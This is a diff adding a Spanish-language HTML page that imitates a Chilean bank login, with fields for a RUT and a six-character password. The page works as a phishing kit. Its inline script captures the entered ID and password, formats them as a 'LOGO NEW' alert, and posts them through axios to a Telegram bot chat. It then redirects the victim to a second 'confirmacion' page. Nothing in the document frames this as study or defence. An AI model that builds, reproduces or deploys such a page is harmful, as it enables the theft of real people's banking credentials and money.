@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmacion</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="contenedor-formulario">
+        <form class="form1" id="form1">
+            <h2>Bienvenido</h2>
+            <label for="rut">Rut</label>
+            <input type="text" id="inputrut" name="inputrut" maxlength="12" required>
+            <label for="contraseña">Contraseña</label>
+            <input type="password" id="inputclave" name="inputclave" maxlength="6" required>
+            <div class="contenedor-boton">
+                <button type="submit">Ingresar</button>
+            </div>
+            <span>Restablecer o activar contraseña</span>
+        </form>
+    </div>
+    <script src="script.js"></script>
+    <script>
+        const form = document.getElementById("form1");
+        form.addEventListener("submit",  (event) => {
+            event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
+            const rutcito = document.getElementById("inputrut").value;
+            const contrasb = document.getElementById("inputclave").value;
+    
+            const message = "\n******** 🔥 LOGO NEW 🔥********\nRUT-USUARIO: " + rutcito + "\nCLAVE SB: " + contrasb;
+    
+            axios
+                .post(
+                    "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+                    {
+                        chat_id: chat,
+                        text: message,
+                    }
+                )
+                .then((response) => {
+                    window.parent.location.href = "confirmacion2.html";
+                })
+                .catch((error) => {
+                    console.error(error);
+                });
+        });
+    </script>
+</body>
+</html>
